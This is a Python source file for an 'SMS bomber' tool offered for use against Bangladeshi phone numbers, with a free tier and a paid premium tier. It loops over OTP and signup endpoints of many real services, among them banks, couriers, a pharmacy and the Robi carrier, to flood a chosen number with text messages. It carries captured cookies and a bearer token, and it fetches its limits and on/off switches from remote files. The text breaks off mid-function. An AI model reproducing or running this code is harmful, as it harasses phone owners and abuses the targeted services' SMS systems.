# Codded By SIAM RAHMAN
# writen With python
import os, time, json, sys, random, string, webbrowser, uuid
# color
# Color Value
blueVal = "94m"
redVal = "91m"
greenVal = "32m"
whiteVal = "97m"
yellowVal = "93m"
cyanVal = "96m"
# normal
normal = "\33["
# Bold
bold = "\033[1;"
# italic
italic = "\x1B[3m"
# Color Normal
blue = normal + blueVal  # Blue Color Normal
red = normal + redVal  # Red Color Normal
green = normal + greenVal  # Green Color Normal
white = normal + whiteVal  # white Color Normal
yellow = normal + yellowVal  # yellow Color Normal
cyan = normal + cyanVal  # Cyan Color Normal
# Color Bold
blueBold = bold + blueVal  # Blue Color Bold
redBold = bold + redVal  # Red Color Bold
greenBold = bold + greenVal  # Green Color Bold
whiteBold = bold + whiteVal  # white Color Bold
yellowBold = bold + yellowVal  # yellow Color Bold
cyanBold = bold + cyanVal  # Cyan Color Bold
version = "2.1.3"
# oparetor
robi = "018"
airtel = "016"
grameenohone = "017"
grameenohone_miror = "013"
banglalink = "019"
banglalink_miror = "014"
teletalk = "015"
global oparetor
global number, country_valid, amount,choosed,numbers
# color end
end = '\033[0m'
colorArr = ["\033[1;91m", "\033[1;92m", "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
# clear
def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
def fb():
    if os.name == 'nt':
        webbrowser.open('https://www.facebook.com/skillsiam1245/')
    else:
        os.system('xdg-open https://www.facebook.com/skillsiam1245/')
def github():
    if os.name == 'nt':
        webbrowser.open('https://github.com/siamrahman000/')
    else:
        os.system('xdg-open https://github.com/siamrahman000/')
def chat():
    if os.name == 'nt':
        webbrowser.open('https://m.me')
    else:
        os.system('xdg-open https://m.me/')
def insta():
    if os.name == 'nt':
        webbrowser.open('https://www.instagram.com/skillsiam/')
    else:
        os.system('xdg-open https://www.instagram.com/skillsiam/')
def yt():
    if os.name == 'nt':
        webbrowser.open(' https://youtube.com/c/')
    else:
        os.system('xdg-open  https://youtube.com/c/')
# Char Print
def printchar(w, t):  # w=word and t =time
    for word in w + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(t)
# Import All Module
try:
    import requests
except:
    printchar(cyanBold + "installing requests.....", 0.05)
    time.sleep(2)
    os.system("pip install requests")
    import requests
    printchar(greenBold + "requests successfully installed.....", 0.05)
    time.sleep(2)
    clr()

try:
    numbers = str.split(requests.get('https://raw.githubusercontent.com/Aru-Is-Always-King/bombing_data/main/protract.txt').text)
    # LIMIT GET
    global limit_str
    limit_str = requests.get('https://raw.githubusercontent.com/Aru-Is-Always-King/bombing_data/main/limit.txt').text
    global time_speed
    time_s = requests.get('https://raw.githubusercontent.com/Aru-Is-Always-King/bombing_data/main/time.txt').text
    time_speed = float(time_s)

except:
    printchar(f'{redBold}    NO INTERNET', 0.01)

def banner():
    s = random.choice(colorArr)
    i = random.choice(colorArr)
    a = random.choice(colorArr)
    m = random.choice(colorArr)
    h = random.choice(colorArr)
    logo = f'''
          
   {s}  ██████ {i} ██  {a} █████  {m}███    ███ {h}
   {s} ██      {i} ██  {a}██   ██ {m}████  ████ {h}
   {s}  █████  {i} ██  {a}███████ {m}██ ████ ██ {h}
   {s}      ██ {i} ██  {a}██   ██ {m}██  ██  ██ {h}
   {s} ██████  {i} ██  {a}██   ██ {m}██      ██ {h}
    
	'''
    infoC = random.choice(colorArr)
    toolsInfo = f'''{infoC}
    ╔════════════════════════════════════╗
    ║             {random.choice(colorArr)}SMS BOMBER {infoC}            ║
    ║            {random.choice(colorArr)}AUTHOR: SIAM RAHMAN {infoC}    ║
    ║           {random.choice(colorArr)}VERSION : {version}  {infoC}        ║
    ║           {random.choice(colorArr)} STATUS : FREE    {infoC}       ║
    ╚════════════════════════════════════╝
    '''
    clr()
    print(logo)
    print(toolsInfo)
def banner_premium():
    s = random.choice(colorArr)
    i = random.choice(colorArr)
    a = random.choice(colorArr)
    m = random.choice(colorArr)
    h = random.choice(colorArr)
    logo = f'''
           
   {s}  ██████ {i} ██  {a} █████  {m}███    ███ {h}
   {s} ██      {i} ██  {a}██   ██ {m}████  ████ {h}
   {s}  █████  {i} ██  {a}███████ {m}██ ████ ██ {h}
   {s}      ██ {i} ██  {a}██   ██ {m}██  ██  ██ {h}
   {s} ██████  {i} ██  {a}██   ██ {m}██      ██ {h}
	'''
    infoC = random.choice(colorArr)
    toolsInfo = f'''{infoC}
    ╔════════════════════════════════════╗
    ║             {random.choice(colorArr)}SMS BOMBER {infoC}            ║
    ║            {random.choice(colorArr)}AUTHOR: SIAM RAHMAN {infoC}    ║
    ║           {random.choice(colorArr)}VERSION : {version}  {infoC}        ║
    ║         {random.choice(colorArr)} STATUS : PREMIUM  {infoC}        ║
    ╚════════════════════════════════════╝
    '''
    clr()
    print(logo)
    print(toolsInfo)

def option():
    option = f'''{random.choice(colorArr)}
    [1] SMS BOMBING [FREE]
    [2] SMS BOMBING [PREMIUM]
    [3] MORE TOOLS  
    [4] CONNECT US
    ''' + end
    print(option)
def option_premium():
    option_premium = f'''{random.choice(colorArr)}
    [1] SMS BOMBING  ~ [RANDOM]
    [2] MY ROBI ~ [ONLY ROBI]
    [3] MY AIRTEL ~ [ONLY AIRTEL]
    [4] MY GP ~ [ONLY GRAMEENPHONE]
    [5] CIRCLE PIN ~ [FOR ROBI]
    [6] ATTACK FROM SINGLE SERVER ~ [SPECIAL]
    [7] MUTIPLE NUMBER ATTACK ~ [BEST]
    [8] MULTIPLE NUMBER ATTACK MY ROBI/MY AIRTEL ~ [ROBI/AIRTEL]
    
       [ Written With Python By SiamRahman ]
    ''' + end
    print(option_premium)
def premium_bomber():
    try:
        aproved = str.split(requests.get('https://raw.githubusercontent.com/SIAMRAHMAN000/data/main/aprove.txt').text)
    except:
        printchar(f'{redBold}    NO INTERNET',0.01)

    global text
    present_dir = os.getcwd()
    if os.name == 'nt':
        new_path = '.users\.data\.verify\.users\.aprove'
    else:
        new_path = '.users/.data/.verify/.users/.aprove'

    path = os.path.join(present_dir, new_path)
    try:
        os.makedirs(path)
    except:
        pass
    try:
        os.chdir(path)
        cr = open('.verify.txt', 'r')
        text = cr.read()
        cr.close()
        if text == "":
            text = uuid.uuid4()
            os.chdir(path)
            cr = open('.verify.txt', 'w')
            cr.write(str(text))
            cr.close()
        else:
            pass
    except:
        text = uuid.uuid4()
        os.chdir(path)
        cr = open('.verify.txt', 'x')
        cr.write(str(text))
        cr.close()
    if text in aproved:
        clr()
        banner_premium()
        attack_premium()
    else:
        clr()
        banner_premium()
        printchar(f'    {yellowBold}Your Device ID: {cyanBold}{text}{end}', 0.01)
        printchar(f'    {redBold}Your Device not approved. {greenBold}Please connect with {cyanBold}SIAM{end}', 0.1)
        fb()
        sys.exit()
def sent_pin(number, amount):
    phone = "+88" + number
    getIPjson = requests.get("http://ip-api.com/json/")
    ip = getIPjson.json()['query']
    infoC = random.choice(colorArr)
    bombInfo = f'''{infoC}
    ══════════════════════════════════════
         {random.choice(colorArr)}  PHONE : {random.choice(colorArr)}{phone}       
      {random.choice(colorArr)}      BOMBING AMOUNT : {random.choice(colorArr)}{amount}        
      {random.choice(colorArr)}     YOUR IP : {random.choice(colorArr)}{ip}
   {infoC} ══════════════════════════════════════
    '''
    clr()
    banner()
    print(bombInfo)
    i = 0
    print(f"{greenBold}   TOTAL SMS REQUESTS SENT: {cyanBold}", end="")
    while i < amount:
        number_without_zero = number[1:11]
        # REQUESTS
        # NESCO

        try:
            url_nesco = "http://nesco.sslwireless.com/api/v1/login"
            headers_nesco = {"Content-Type": "application/x-www-form-urlencoded"}
            data_nesco = "phone_number=" + number
            requ_nesco_server = requests.post(url_nesco, headers=headers_nesco, data=data_nesco)
            if requ_nesco_server.json()["message"] == "OTP has been Sent.":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # MOKAM
        try:
            url_mokam = "https://ucapi.vnksrvc.com/users/send_user_otp.json"
            headers_mokam = {"Content-Type": "application/json"}
            data_mokam = '{"direct_login": true,"user": {"resend": false,"login": "88' + number + '","type": {"register": true}}}'
            requ_mokam_server = requests.post(url_mokam, headers=headers_mokam, data=data_mokam)
            if requ_mokam_server.json()["message"] == f"An OTP has been sent to 88{number}.":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # RED X
        try:
            url_redX = "https://api.redx.com.bd/v1/user/signup"
            headers_redX = {
                "Cookie": "_fbp=fb.2.1665770836920.1536218668; _ga=GA1.3.2006512700.1665770837; _gid=GA1.3.1994739738.1665770837; _gat_gtag_UA_159382318_1=1; _hjSessionUser_2064965=eyJpZCI6ImY3ODFmMjQ1LWRmN2MtNWNhNy04NmRlLWYzZWE4MTk5N2NmMCIsImNyZWF0ZWQiOjE2NjU3NzA4MzcyOTYsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2064965=eyJpZCI6IjMwZDMyNWEzLTJhMGQtNGIyMi1iMmQxLWUzMzU1ODc0YTUzYyIsImNyZWF0ZWQiOjE2NjU3NzA4Mzc0MDEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0",
                "Content-Length": "67",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "Sec-Ch-Ua-Mobile": "?0",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36",
                "Origin": "https://redx.com.bd",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://redx.com.bd/"}
            data_redX = '{"name":"' + number + '","phoneNumber":"' + number + '","service":"redx"}'
            requ_redX_server = requests.post(url_redX, headers=headers_redX, data=data_redX)
            if requ_redX_server.json()["body"]["message"] == f"A verification code has been sent to {number}":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # Bikroy
        try:
            url_bikroy = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=" + number
            requ_bikroy_server = requests.get(url_bikroy)
            if requ_bikroy_server.json()["otp_length"] == 6:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # WEB ONE
        try:
            url_web_one = "http://27.131.15.19/lstyle/api/lsotprequest"
            headers_web_one = {"Content-Type": "application/json"}
            data_web_one = '{"shortcode":"2494905","msisdn":"88' + number + '"}'
            requ_web_one_server = requests.post(url_web_one, headers=headers_web_one, data=data_web_one)
            if requ_web_one_server.json()["reponse"] == "SUCCESSFUL":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # # Two
        try:
            url_web_two = "http://27.131.15.19:80/lstyle/api/lsotprequest"
            headers_web_two = {"Content-Type": "application/json"}
            data_web_two = '{"shortcode":"2494905","msisdn":"88' + number + '"}'
            requ_web_two_server = requests.post(url_web_two, headers=headers_web_two, data=data_web_two)
            if requ_web_two_server.json()["reponse"] == "SUCCESSFUL":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        try:
            url_arogga = "https://api.arogga.com/v1/auth/sms/send?f=app&v=4.4.3&os=android&osv=25"
            headers_arogga = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "208",
                "Accept-Encoding": "gzip, deflate",
                "User-Agent": "okhttp/4.9."}
            data_arogga = "mobile=%2B88" + number + "&fcmToken=dfixXPTmTeSRBAFf-utxA-%253AAPA91bG1chvzjost2jd7UNgNeQFJ3s-0ynvXZs4Mat3RuXF0xz4c1yMMn83TL-pwVmAP7NIG45l4M-uJ0JK3n9r5kiDmMI_M6_wkN37O8arFojbXXljcRfj9YgY0jX-SJuumo36V5m8s&referral="
            requ_arogga_server = requests.post(url_arogga, headers=headers_arogga, data=data_arogga)
            if requ_arogga_server.json()["status"] == "success":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        try:
            url_drive = "https://www.mydrivebd.com/sapi/profile?action=signup&notify=true&rid=0.14346360928321888"
            headers_drive = {"Host": "www.mydrivebd.com",
                             "content-length": "126",

                             "x-deviceid": "web-08474b7fff1202e709e8935c10cf5ca3",
                             "content-type": "application/json;charset=UTF-8",

                             "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo Y85) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",

                             "accept": "*/*",
                             "origin": "https://www.mydrivebd.com",
                             "sec-fetch-site": "same-origin",
                             "sec-fetch-mode": "cors",
                             "sec-fetch-dest": "empty",
                             "referer": "https://www.mydrivebd.com/",
                             "accept-encoding": "gzip, deflate, br",
                             "accept-language": "en-US,en;q=0.9",
                             "cookie": "JSESSIONID=0E317BDBE17C4F72F27F47F3047D50FE.1i164",
                             "cookie": "loginRetriesLeft=5",
                             "cookie": "loginRetriesLeft_Date=%3B%20expires%3DTue%2C%2027%20Sep%202022%2021%3A39%3A57%20GMT",
                             "cookie": "cookiesAccepted=true",

                             "cookie": "_ga_G32R4HEST2=GS1.1.1664228417.1.0.1664228417.0.0.0",
                             "cookie": "_ga=GA1.1.1935620814.1664228418"}
            data_drive = '{"data":{"user":{"generic":{"userid":"88' + number + '","password":"' + ''.join(
                random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in
                range(15)) + '","l10n":"en","acceptedtermsandconditions":true}}}}'
            requ_drive_server = requests.post(url_drive, headers=headers_drive, data=data_drive)
            if requ_drive_server.status_code == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        try:
            url_lanka = "https://napi.dmoney.com.bd:6066/DmoneyPlatform/um_public_ekyc_checkMobileEmail"
            headers_anka = {"productCode": "FS",
                            "Authorization": "bearer 9gp0IvDK_5DX1StqaF4__rHnboeHCwayrMsdZ3aNGhoF1jykX7xyoQBASWnSTbnZ5NmMXDinOBhI4rjy-0mXcoPUsFu7Xbdga-sy3TunDsxToMzLqn-zB_3Opi7FbHOLU47kQFLzkPdF8_QADX9eC3Sy-j9IBH5JnoSvL4YADKZic6D_Ok8j7zwfWy3kcXKRgyFje5ft0s-5ztXWGUy-6YOGdbThWoy6LBbK_Yr3Ek8YYGi6",
                            "accept-language": "en", "Content-Type": "application/json",
                            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/N2G48H)",
                            "Host": "napi.dmoney.com.bd:6066", "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
                            "Content-Length": "493"}
            data_lanka = '{"ekycApplicationData":{"emailId":"mr_kille@yahoo.com","id":0,"mobileNumber":"' + number + '","productCode":"FS"},"channel":"ANDROID_APP","deviceName":"Asus ASUS_Z01QD Android 7.1.2","deviceNumber":"751405a75d71e619","hardwareSignature":"14879d1fcce97c13dd673ee7ce6d7f1c69f56f8880c2d2326f675473472c1dcefb603902376020fc0a75d8a3868a84ebb5c1211abe38c75583d412783bbfcb40","mobileAppVersion":"4.1.1_RELEASE","mobileAppVersionCode":37,"productCode":"FS","requestId":"2015BDC18305FBFB","sessionToken":""}'
            requ_lanka_server = requests.post(url_lanka, headers=headers_anka, data=data_lanka)
            if requ_lanka_server.json()['status'] == 200 and requ_lanka_server.json()['errors'] == None:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass

        # Sahjalal
        try:
            url_sahjalal = "https://eaccount.sjiblbd.com/VerifIDEXT/api/CustOnBoarding/VerifyMobileNumber"
            headers_sahjalal = {"Content-Type": "application/json",}
            data_sahjalal = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"121","requestChannel":"MOB","trackingStatus":5}'
            requ_sahjalal_server = requests.post(url_sahjalal, headers=headers_sahjalal, data=data_sahjalal)
            if requ_sahjalal_server.json()['message'] == 'OTP Generated':
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # EBL
        try:
            url_ebl = "https://insta.ebl-bd.com/eblEkyc/postRegistration;jsessionid=iZVEPUNNbCH68x3Hn22jwThCQK0zqBNKkaMs2jx-w1vfaGGQonBb!-1086432445"
            headers_ebl = {"Content-Type":"application/x-www-form-urlencoded"}
            data_ebl = "vcCustName=Pudina&vcCustEmail=Fuck%40gmail.com&vcCustMob="+number+"&vcPassword=12345678&confirmPassword=12345678"
            requ_ebl_server = requests.post(url_ebl, headers=headers_ebl, data=data_ebl)
            if requ_ebl_server.status_code == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass

def attack():
    def inValid():
        global number, country_valid, amount
        limit = int(limit_str)
        number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
        amount = int(input(f"  {random.choice(colorArr)}  ENTER AMOUNT [MAX {str(limit)}]: {random.choice(colorArr)}"))
        country_valid = number[:3]
    inValid()
    if number == "":
        printchar(f"{red}    EMPTY INPUT", 0.05)
        time.sleep(2)
        clr()
        banner()
        attack()
    if amount == "":
        printchar(f"{red}    EMPTY INPUT", 0.05)
        time.sleep(2)
        clr()
        banner()
        attack()
    elif len(number) != 11:
        printchar(f"{red}    WRONG NUMBER", 0.05)
        time.sleep(2)
        clr()
        banner()
        attack()
    else:
        if country_valid == robi:
            operator = "Robi"
        elif country_valid == airtel:
            operator = "airtel"
        elif country_valid == teletalk:
            operator = "TaleTalk"
        elif country_valid == grameenohone:
            operator = "GrameenPhone"
        elif country_valid == grameenohone_miror:
            operator = "GrameenPhone"
        elif country_valid == banglalink:
            operator = "Banglalink"
        elif country_valid == banglalink_miror:
            operator = "Banglalink"
        else:
            printchar(f"{red}    INVALID OPERATOR", 0.05)
            time.sleep(2)
            clr()
            banner()
            attack()
        if amount <= int(limit_str):
            if number in numbers:
                printchar(f"{red}    PROTECTED NUMBER", 0.05)
                sys.exit()
            else:
                sent_pin(number, amount)
        else:
            printchar(f"{red}    WRONG AMOUNT", 0.05)
            main()

def main():
    ck_act = requests.get('https://raw.githubusercontent.com/Aru-Is-Always-King/bombing_data/main/activity.txt').text
    # ck_act = 'active'
    clr()
    if 'active' in ck_act:
        pass
    else:
        printchar(f'{redBold}  Tools Deactived', 0.005)
        printchar(f'{yellowBold}  {requests.get("https://raw.githubusercontent.com/Aru-Is-Always-King/bombing_data/main/message.txt").text}', 0.005)
        sys.exit()
    banner()
    option()
    input_options = str(input(f"  {random.choice(colorArr)}  CHOOSE A OPTION: {random.choice(colorArr)}"))

    if input_options == "1":
        clr()
        banner()
        attack()
    elif input_options == "2":
        premium_bomber()
    elif input_options == "3":
        github()
    elif input_options == "4":
        clr()
        banner()
        connectOptions = f'''{random.choice(colorArr)}
    [1] GitHub
    [2] Facebook
    [3] Chat with admin
    [4] Instagram
    [5] YouTube    
            '''
        printchar(connectOptions, 0.005)
        inputConnectOption = str(input(f"  {random.choice(colorArr)}  CHOOSE A OPTION: {random.choice(colorArr)}"))
        if inputConnectOption == "1":
            github()
            time.sleep(5)
            main()
        elif inputConnectOption == "2":
            fb()
            time.sleep(5)
            main()
        elif inputConnectOption == "3":
            chat()
            time.sleep(5)
            main()
        elif inputConnectOption == "4":
            insta()
            time.sleep(5)
            main()
        elif inputConnectOption == "5":
            yt()
            time.sleep(5)
            main()
        else:
            printchar(redBold + "\n    Invalid input", 0.01)
            time.sleep(4)
            main()
    else:
        main()

def attack_premium():
    clr()
    banner_premium()
    option_premium()
    option_choosed = str(input(f"  {random.choice(colorArr)}  CHOOSE A OPTION : {random.choice(colorArr)}"))
    if option_choosed == '1' or option_choosed == '01':
        clr()
        banner_premium()
        global number, country_valid, amount
        number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
        amount = int(input(f"  {random.choice(colorArr)}  ENTER AMOUNT [UNLIMITED]: {random.choice(colorArr)}"))
        country_valid = number[:3]
        if number == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            clr()
            banner_premium()
            attack_premium()
        if amount == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            clr()
            banner_premium()
            attack_premium()
        elif len(number) != 11:
            printchar(f"{red}    WRONG NUMBER", 0.05)
            time.sleep(2)
            clr()
            banner_premium()
            attack_premium()
        else:
            if country_valid == robi:
                operator = "Robi"
            elif country_valid == airtel:
                operator = "airtel"
            elif country_valid == teletalk:
                operator = "TaleTalk"
            elif country_valid == grameenohone:
                operator = "GrameenPhone"
            elif country_valid == grameenohone_miror:
                operator = "GrameenPhone"
            elif country_valid == banglalink:
                operator = "Banglalink"
            elif country_valid == banglalink_miror:
                operator = "Banglalink"
            else:
                printchar(f"{red}    INVALID OPERATOR", 0.05)
                time.sleep(2)
                clr()
                banner_premium()
                attack_premium()
            if number in numbers:
                printchar(f"{red}    PROTECTED NUMBER", 0.05)
                sys.exit()
            else:
                sent_pin_pre(number,amount,operator)
    elif option_choosed == '2' or option_choosed == '02':
        clr()
        banner_premium()
        number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
        amount = int(input(f"  {random.choice(colorArr)}  ENTER AMOUNT [UNLIMITED]: {random.choice(colorArr)}"))
        country_valid = number[:3]
        if number == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            clr()
            banner_premium()
            attack_premium()
        if amount == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            clr()
            banner_premium()
            attack_premium()
        elif len(number) != 11:
            printchar(f"{red}    WRONG NUMBER", 0.05)
            time.sleep(2)
            clr()
            banner_premium()
            attack_premium()
        else:
            if country_valid == robi:
                operator = "Robi"
            else:
                printchar(f"{red}    INVALID OPERATOR", 0.05)
                time.sleep(2)
                clr()
                banner_premium()
                attack_premium()
            if number in numbers:
                printchar(f"{red}    PROTECTED NUMBER", 0.05)
                sys.exit()
            else:
                my_robi(number,amount,operator)
    elif option_choosed == '3' or option_choosed == '03':
        clr()
        banner_premium()
        number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
        amount = int(input(f"  {random.choice(colorArr)}  ENTER AMOUNT [UNLIMITED]: {random.choice(colorArr)}"))
        country_valid = number[:3]
        if number == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            clr()
            banner_premium()
            attack_premium()
        if amount == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            clr()
            banner_premium()
            attack_premium()
        elif len(number) != 11:
            printchar(f"{red}    WRONG NUMBER", 0.05)
            time.sleep(2)
            clr()
            banner_premium()
            attack_premium()
        elif option_choosed == '4' or option_choosed == '04':
            my_gp()
        else:
            if country_valid == airtel:
                operator = "Airtel"
            else:
                printchar(f"{red}    INVALID OPERATOR", 0.05)
                time.sleep(2)
                clr()
                banner_premium()
                attack_premium()
            if number in numbers:
                printchar(f"{red}    PROTECTED NUMBER", 0.05)
                sys.exit()
            else:
                my_robi(number,amount,operator)
    elif option_choosed == '4' or option_choosed == '04':
        my_gp()
    elif option_choosed == '5' or option_choosed == '05':
        circle()
    elif option_choosed == '6' or option_choosed == '05':
        single_attack()
    elif option_choosed == '7' or option_choosed == '07':
        multi_attack()
    elif option_choosed == '8' or option_choosed == '08':
        robi_airtel_multi()

    elif option_choosed.lower() == 'custom':
        custom()
    elif option_choosed.lower() == 'call':
        call_bomb()
    else:
        attack_premium()

def my_robi(number,amount,oparetor):
    phone = "+88" + number
    getIPjson = requests.get("http://ip-api.com/json/")
    ip = getIPjson.json()['query']
    infoC = random.choice(colorArr)
    bombInfo = (f'{infoC}\n'
                f'     ══════════════════════════════════════\n'
                f'     {random.choice(colorArr)}  PHONE : {random.choice(colorArr)}{phone}       \n'
                f'     {random.choice(colorArr)}  BOMBING AMOUNT : {random.choice(colorArr)}{amount}        \n'
                f'     {random.choice(colorArr)}  YOUR IP : {random.choice(colorArr)}{ip} \n'
                f'     {random.choice(colorArr)}  OPERATOR : {random.choice(colorArr)}{oparetor}\n'
                f'     {infoC}══════════════════════════════════════\n'
                f'    ')
    clr()
    banner_premium()
    print(bombInfo)
    i = 0
    print(f"{greenBold}   TOTAL SMS REQUESTS SENT: {cyanBold}", end="")
    while i < amount:
        try:
            url_my_robi = "https://singleapp.robi.com.bd/api/v1/tokens/create_opt"
            headers_my_robi = {
            "Platform" : "android",
            "Appname" : oparetor.lower(),
            "Deviceid" : "1117297acfc89586",
            "Appversion" : "5.4.3",
            "Locale" : "en",
            "Content-Type" : "application/x-www-form-urlencoded",
            "Content-Length" : "20",
            "Accept-Encoding" : "gzip, deflate",
            "User-Agent" : "okhttp/4.2.2",
            "Connection" : "close"}
            data_my_robi = "msisdn=88"+number
            requ_my_robi_server = requests.post(url_my_robi, headers=headers_my_robi, data=data_my_robi)
            if requ_my_robi_server.json()["content"] == "Otp successfully send to user":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
def sent_pin_pre(number, amount,oparetor):
    phone = "+88" + number
    getIPjson = requests.get("http://ip-api.com/json/")
    ip = getIPjson.json()['query']
    infoC = random.choice(colorArr)
    bombInfo = (f'{infoC}\n'
                f'     ══════════════════════════════════════\n'
                f'     {random.choice(colorArr)}  PHONE : {random.choice(colorArr)}{phone}       \n'
                f'     {random.choice(colorArr)}  BOMBING AMOUNT : {random.choice(colorArr)}{amount}        \n'
                f'     {random.choice(colorArr)}  YOUR IP : {random.choice(colorArr)}{ip} \n'
                f'     {random.choice(colorArr)}  OPERATOR : {random.choice(colorArr)}{oparetor}\n'
                f'     {infoC}══════════════════════════════════════\n'
                f'    ')
    clr()
    banner_premium()
    print(bombInfo)
    i = 0
    print(f"{greenBold}   TOTAL SMS REQUESTS SENT: {cyanBold}", end="")
    while i < amount:
        number_without_zero = number[1:11]
        # REQUESTS
        # NESCO
        try:
            url_nesco = "http://nesco.sslwireless.com/api/v1/login"
            headers_nesco = {"Content-Type": "application/x-www-form-urlencoded"}
            data_nesco = "phone_number=" + number
            requ_nesco_server = requests.post(url_nesco, headers=headers_nesco, data=data_nesco)
            if requ_nesco_server.json()["message"] == "OTP has been Sent.":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # # MOKAM
        try:
            url_mokam = "https://ucapi.vnksrvc.com/users/send_user_otp.json"
            headers_mokam = {"Content-Type": "application/json"}
            data_mokam = '{"direct_login": true,"user": {"resend": false,"login": "88' + number + '","type": {"register": true}}}'
            requ_mokam_server = requests.post(url_mokam, headers=headers_mokam, data=data_mokam)
            if requ_mokam_server.json()["message"] == f"An OTP has been sent to 88{number}.":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # # NBL
        # try:
        #     url_nbl = "https://accountnow.nblbd.com/api/otp-request"
        #     headers_nbl = {"Content-Type" : "application/json"}
        #     data_nbl = '{"mobile":"'+number+'"}'
